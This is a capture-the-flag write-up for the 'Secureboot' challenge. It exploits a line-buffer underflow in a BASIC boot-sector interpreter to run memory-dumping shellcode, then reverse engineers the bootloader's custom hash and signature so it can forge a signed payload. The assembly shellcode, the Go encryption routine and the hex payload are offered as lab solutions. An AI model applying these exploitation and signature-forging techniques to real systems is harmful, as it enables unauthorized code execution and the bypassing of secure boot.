# Secureboot

> There are two versions of the bootloader, one with a test key and one with a production key. This challenge has three stages,
>
> * first you need to obtain the test bootloader image
> * then you have to reverse engineer it and sign your own image with the test key
> * at the end you have to sign the image with the production key to prove that you are l33t
>
> The flag for each stage in on an attached drive. Details on the deployment can be found in the Dockerfile.

* **Categories:** Pwn, Reverse Engineering, Crypto
* **Difficulty:** Hard
* **Author:** localo

## Exploration

### Setup

Our entrypoint is a TCP connection to the `server.py` program.
Each time a connection is made, it spawns the QEMU emulator with 3 disks attached.
Stdin and stdout/stderr are mapped to the TCP socket.

```py
cmd = [
    '/usr/bin/qemu-system-i386',
    '-drive', f'format=raw,file={bootloader_path}',
    '-drive', f'format=raw,file={mbr_path}',
    '-drive', f'format=raw,file={flag_path}',
    '-display', 'curses',
    '-monitor', 'none',
]
if no_graphic:
    cmd += ['-nographic']
```

The three disks being provided are user controllable.
  1. The bootloader disk can be set to either _TEST_ or _PROD_,
     though we cannot trivially see its content.
  2. The second disk is 520 byte large and entirely user-controllable (uploaded on startup).
     The challenge files contain four example inputs.
  3. The third disk one of three flags depending on the inputs for disks 1 & 2.
     - Flag 1: Disk 1 is _TEST_ bootloader and disk 2 is one of the challenge files.
     - Flag 2: Disk 1 is _TEST_ bootloader and disk 2 is not one of the example inputs.
     - Flag 3: Disk 1 is _PROD_ bootloader.

We can further derive the following info by looking at the QEMU setup:
- The BIOS loads disk 1 (bootloader) at `0x7c00` and jumps to it after system startup.
- Bootloader contains unknown "secure boot" checks that load and verify disk 2.
- If verification of disk 2 passes, the booloader finally jumps to it.
- The system probably never leaves 16-bit real mode.

### Images

The four example inputs for disk 2 are bootable disks (MBR) with their source code available.
- `nanochess/basic`: A BASIC interpreter.
- `nanochess/fbird`: A "Flappy Bird" like game in graphic mode.
- `nanochess/lights`: A game with minimal inputs.
- `daniel-e/tetros`: A Tetris clone in graphic mode.

All four programs run fine as standalone.

```shell
qemu-system-i386 -drive format=raw,file=./basic-test.bin -display curses -monitor none -nographic
```

When providing these images to the challenge server, they seem to execute identically.

### Signature Checks

The last 8 bytes of the disks seem to be some sort of signature / MAC (message authentication code) as they are not used during standalone execution.

When modifying the signature of the `basic` image the bootloader prints the following error message. The hex string stays the same for any signature.

```
Booting from Hard Disk...
Invalid signature!
                  B77FC96268C76D92
```

When modifying the data part, the hex string changes completely.

```
Booting from Hard Disk...
Invalid signature!
                  C2D69D9FDF812900
```

We can thus conclude that the hex string displayed is some sort of hash of the data part.
We can further assume for now that the signature is dependent, i.e. hash-and-sign.

```
> hash(data_1) == hash(data_2)
implies
> hash_mac(data_1) == hash_mac(data_2)
if the following holds
> hash_mac(x) := mac(key, hash(x))
```

The tool [CyberChef](https://gchq.github.io/CyberChef/) bundles a variety of hash and encryption algorithms. Applying those on the first 512 bytes (or 520 bytes with zeroed signature) of the sample images revealed no matches for the hash.

The bootloader is thus treated as a black box with unknown cryptography until we can extract more info.

## Flag 1

_Obtaining the test bootloader image_

None of the available images in perform any disk accesses nor are they supposed to allow arbitrary memory access.
As suggested by the hints, we'll try building a read primitive exploit.

The `basic` image is by far the most interesting.
- It accepts and parses arbitrary text input.
- It addresses ~25 variables to persist data, e.g. `a = 2 + 3`

The other three programs appear to be neat games, but only exhibit primitive reactions to a few keys.
The program's allocated memory can be inspected by running it in QEMU with a debugger attached.

```shell
# Window 1
qemu-system-i386 -display curses -monitor none -drive format=raw,file=./basic-test.bin -s
# Window 2
r2 -b 16 -d gdb://localhost:1234
```

Luckily, the program does not use segmentation – code and data (including user-input) is accessible from the same segment.
The memory map of the `basic` image as follows.

```
[7c00..7e00] ROM
[7e00..7e40] Variables
[7e80..????] Line buffer
```

The `get_variable` function is not exploitable per-se because `and al, 0x1f` bounds the addressable memory to `7e00..7e40`.
([Source](https://github.com/nanochess/bootBASIC/blob/f025672338a552e0a2531cd318f2a55a0efc96c0/basic.asm#L374))
However it does form the basis of a useful arbitrary read-write primitive.
The input `a = 5\r` would write `05 00` (little endian) to address `7e02`.

```asm
        ;
        ; Get variable address.
        ; Also avoid spaces.
        ;
get_variable:
        lodsb               ; Read source
get_variable_2:
        and al,0x1f         ; 0x61-0x7a -> 0x01-0x1a
        add al,al           ; x 2 (each variable = word)
        mov ah,vars>>8      ; Setup high-byte of address
        dec si
```

The line buffer is filled it with characters from command-line input as the user is typing.
Notably, there are no bounds checks at all and it supports undoing input via backspaces.
([Source](https://github.com/nanochess/bootBASIC/blob/f025672338a552e0a2531cd318f2a55a0efc96c0/basic.asm#L481))

```asm
input_line:
        call output
        mov si,line
        push si
        pop di          ; Target for writing line
f1:     call input_key  ; Read keyboard
        stosb           ; Save key in buffer
        cmp al,0x08     ; Backspace?
        jne f2          ; No, jump
        dec di          ; Get back one character
        dec di
f2:     cmp al,0x0d     ; CR pressed?
        jne f1          ; No, wait another key
        ret             ; Yes, return
```

By sending enough backspaces, `ES:DI` (destination register) is manipulated to point to area occupied by the ROM.

Placing shellcode into the code area using the line buffer underflow is not practical.
BIOS input is roughly limited to ASCII-printable characters: The high character range `0x80..0xff` is unusable and gets mangled.

The area just before the end of the ROM contains a lookup table of function pointers of user command handlers.

```
0000:7dc0  e105 0080 c304 6e65 7700 7c05 6c69 7374  ......new.|.list
0000:7dd0  6b7c 0472 756e 4c7d 0670 7269 6e74 827d  k|.runL}.print.}
0000:7de0  0669 6e70 7574 8a7c 0369 662a 7c05 676f  .input.|.if*|.go
0000:7df0  746f 487d 0773 7973 7465 6d46 7d01 55aa  toH}.systemF}.U.
```

Luckily, most memory addresses are "printable enough".
A pointer to the variable buffer `0x7e02`, can be written via line input unchanged.
As stated earlier, using variable input we can write a small piece of arbitrary bytes with no bounds restrictions.

This gives us all pieces to gain code execution:
1. Send backspaces to place the line input pointer at `0x7dfb`.
2. Replace the `system` comamnd handler:
   Write bytes `02 7e`.
3. Move line input pointer forward to avoid memory corruption:
   Write bytes `01` (list terminator) and `41 41` (padding).
4. Write `0d` (carriage return) to reset line input.
5. Place shellcode using a series of variable writes `a = ???\r`, `b = ???\r`, etc.
6. Jump to shellcode by writing `system\r`.

The shellcode has the following purpose:
- Read sectors of the bootloader disk or flag disk.
- Dump contents to the terminal.

Due to size constraints, the dump procedure is very simple.
- Loop over each byte in memory.
- Base16-encode the memory content with alphabet `ABCDEFGHIJKLMNOP`.
  - `print(char(0x41 + (al >> 4)))`
  - `print(char(0x41 + (al & 0x0f)))`

```
# Load flag into memory using "read sector" BIOS interrupt.
    mov si, 0    # point source to 0000:0000
    mov ax, 0x202
    mov bx, 0x9000
    #mov dx, 0x80 # 0x80: Bootloader disk
    mov dx, 0x82 # 0x82: Flag disk
    mov cx, 0x1
    int 0x13

# Loop forever over memory and print it out.
loop:
    lodsb        # load byte and increment
    mov ch, al
    mov cl, al

    # setup print
    mov ah, 0x0e
    mov bx, 0x0007

    # calc base16 encoding
    shr ch, 4    # upper 4 bits
    add ch, 0x41
    mov al, ch
    int 0x10

    and cl, 0x0f # lower 4 bits
    add cl, 0x41
    mov al, cl
    int 0x10

    jmp loop
```

To assemble, use [Keystone](https://www.keystone-engine.org/).

```shell
kstool -b x16 "$(cat ./shellcode.s)" 7e02 | xxd -i -c8
```

Go was used to automate the upload of input and download/decoding of the memory dump.

```shell
python3 -c 'print(0x9000)'
36864

dd bs=1 if=dump_with_test_flag.bin skip=36864 status=none | strings | head -n1
...FLAG...

dd bs=1 count=512 if=dump_with_test_bootloader.bin skip=36864 of=test_bootloader.bin
```

The test environment can now be run locally.

```shell
qemu-system-i386 \
  -display curses -monitor -nographic \
  -drive format=raw,file=./test_booloader.bin \
  -drive format=raw,file=./basic-test.bin
```

Note: While the bootloader is still loaded at `0x0600`, some important initialized data has been overriden already, modifying the hash check behavior, and failing sig verify.
This is why we need a clean dump of the bootloader disk.

## Flag 2

_Reverse engineer the bootloader and sign your own image with the test key_

Again, we start with a debugger session, this time with the bootloader attached.
This time, execution is halted until the debugger connects to allow tracing the bootloader step by step.

```shell
# Window 1
qemu-system-i386 \
  -s -S \
  -display curses -monitor -nographic \
  -drive format=raw,file=./test_booloader.bin \
  -drive format=raw,file=./basic-test.bin
# Window 2
r2 -b 16 -d gdb://localhost:1234
```

Additionally, we load the full memory dump from earlier into [Ghidra](https://ghidra-sre.org/).

### Bootloader Relocation

Upon startup, the bootloader relocates itself from `0x7c00` to `0x0600`.

```asm
0000:7c01 bc007c          MOV        SP,0x7c00
0000:7c04 be007c          MOV        SI,0x7c00
0000:7c07 bf0006          MOV        DI,0x600
0000:7c0a b98000          MOV        CX,0x80
0000:7c0d fc              CLD
0000:7c0e f366a5          MOVSD.REP  ES:DI,SI
0000:7c11 66ea19060       JMPF       0x0:LAB_0000_0619
```

Then, it loads the second drive (program) to `0x7c00`.

```asm
0000:061a b80202          MOV        AX,0x202
0000:061d bb007c          MOV        BX,0x7c00
0000:0620 b281            MOV        DL,0x81
0000:0622 b90100          MOV        CX,0x1
0000:0625 b600            MOV        DH,0x0
0000:0627 cd13            INT        0x13
```

### Hash Algorithm

`0764..076c` (sig_1) stores a copy of the hash seen in the bootloader error screen.
`076c..0774` (sig_2) appears to be a scratch area for hash calculation.
The hash is written by the main routine code at `0629..066b`.

Tracing the outer loop of the hash algorithm (at `0630`) reveals that
the algorithm steps along the disk in blocks of eight bytes.

```
:> db 0000:0630

:> dc
hit breakpoint at: 0x630
:> px16 @0000:0764
- offset -  0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0000:0764  0000 0000 0000 0000 0000 0000 0000 0000  ................
:> dr edi
0x00007c00

:> dc
hit breakpoint at: 0x630
:> px16 @0000:0764
- offset -  0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0000:0764  7fbc de37 1f78 7dc7 0000 0000 0000 0000  ...7.x}.........
:> dr edi
0x00007c08

:> dc
hit breakpoint at: 0x630
:> px16 @0000:0764
- offset -  0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0000:0764  ef15 531a ff28 8a0c 7fbc de37 1f78 7dc7  ..S..(.....7.x}.
:> dr edi
0x00007c10
```

At `069c` is a one-way function encrypting an 8-byte block of data using the bootloader ROM as the encryption key.

Together, the hash function processes blocks as follows.
- Swap `sig_2 <- sig_1` (at `0632..063c`)
- `sig_1 <- encrypt(block, key)` (at func `069c`)
- `sig_1 <- XOR(sig_1, sig_2)` (at `0647..065c`)

### Signature check decryption algorithm

The function at `06c2` transforms the "signature" at `7e00..7e08` (i.e. the last 8 bytes of the second disk).
Before, it is `f93a50e96235aa11`, afterwards it is `b77fc96268c76d92` (the same value as the decrypted hash).

Reverse engineering of the function's content reveals this pseudocode.

```go
func decrypt8(loader *[512]byte, data *[8]byte, key *[8]byte) {
	for cx := uint16(0x100); cx > 0; cx-- {
		dx1 := (cx - 1) % 8
		dx2 := cx % 8
		data[dx2] = bits.RotateLeft8(data[dx2], 7) - loader[data[dx1]+key[dx]]
	}
}
```

More precisely, this decryption algorithm reads the following input:
- The encrypted hash at `7e00..7e08`
- The bootloader content `7c00..7d00`
- The encryption key at `06ed..06f5` (value `4100410041004100`)

After decryption, this value is then compared against the result of the hash function.

```
0000:0678 be007e          MOV        SI,0x7e00
0000:067b 8d3e6407        LEA        DI,[0x764]
0000:067f b90800          MOV        CX,0x8
0000:0682 f3a6            CMPSB.REPE ES:DI,SI
```

In order to get the second flag we need to build the inverse function to the decryption algorithm.
The encryption function is attained by reversing the order of operations within the loop
and reversing the order of iteration.

```go
func encrypt8(loader *[512]byte, data *[8]byte, key *[8]byte) {
	for cx := uint16(0); cx < 0x100; cx++ {
		dx2 := (cx + 1) % 8
		dx1 := cx % 8
		data[dx2] = bits.RotateLeft8(data[dx2]+loader[data[dx1]+key[dx1]], 1)
	}
}
```

### Getting the flag

All cryptographic operations so far have been added to `crypto.go` (hash, decrypt, encrypt).

To test our tool, we run it over the test bootloader & basic image.

```
% go run ./crypto.go -bootloader=./test_booloader.bin -target=./basic-test.bin -key 4100410041004100
Image hash:      b77fc96268c76d92
Image signature: f93a50e96235aa11
Expected hash:   b77fc96268c76d92
OK
Fake signature:  f93a50e96235aa11
```

This allows us to craft a basic signed program dumping the flag.

```
b80202bb0090ba8200b90100cd13be0090ac08c07406b40ecd10ebf5faf4
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000067675399978ff00bEOF
```
